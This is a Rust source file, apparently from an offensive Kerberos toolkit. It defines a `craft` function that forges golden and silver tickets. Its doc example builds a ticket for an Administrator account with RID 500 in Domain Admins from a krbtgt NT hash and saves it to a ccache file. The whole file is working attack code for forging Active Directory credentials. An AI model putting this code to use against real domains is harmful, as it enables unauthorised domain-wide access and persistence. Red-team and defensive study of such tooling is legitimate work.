use crate::{
	core::{craft_ticket_info, CredFormat, EncryptionType, TicketCreds, Vault},
	Error, KrbUser, Result,
};
use kerberos_crypto::Key;
use ms_pac::PISID;

/// Crafts gold and silver tickets
///
/// # Examples
///
/// ```
/// let vault = FileVault::new("tickets.ccache".to_string());
///
/// let rid = 500;
/// let group_rids = [512];
///
/// let krbtgt = Key::from_rc4_key_string("KRBTGT NT HASH").expect("Failed to convert krbtgt key");
///
/// match craft(
///             "DOMAIN.COM",
///             "Administrator",
///             None,
///             krbtgt,
///             rid,
///             "DOMAIN SID",
///             &group_rids,
///             Some(EncryptionType::RC4),
///             CredFormat::Ccache,
///             &vault,
/// )
/// {
///     Ok(_) =>
///     {
///         for ticket in vault.dump().expect("Failed to dump tickets").iter()
///         {
///             println!("{:?}", ticket);
///         }
///     },
///     Err(e) => panic!("Failed to craft a golden ticket: {}", e),
/// };
/// ```
pub fn craft(realm: &str,
             username: &str,
             service: Option<String>,
             ticket_key: Key,
             user_rid: u32,
             realm_sid: &str,
             groups: &[u32],
             ticket_key_enc: Option<EncryptionType>,
             cred_format: CredFormat,
             vault: &dyn Vault)
             -> Result<()>
{
	let pisid = match PISID::try_from(realm_sid)
	{
		Ok(p) => p,
		Err(e) => return Err(Error::String(e)),
	};

	let user = KrbUser::new(username.to_string(), realm.to_string());

	let ticket_info = craft_ticket_info(
	                                    user,
	                                    service.clone(),
	                                    ticket_key,
	                                    user_rid,
	                                    pisid,
	                                    groups,
	                                    ticket_key_enc.map(|e| e.as_constant()),
	);

	let krb_cred_plain = TicketCreds::new(vec![ticket_info]);

	vault.save_as(krb_cred_plain, cred_format)?;

	Ok(())
}
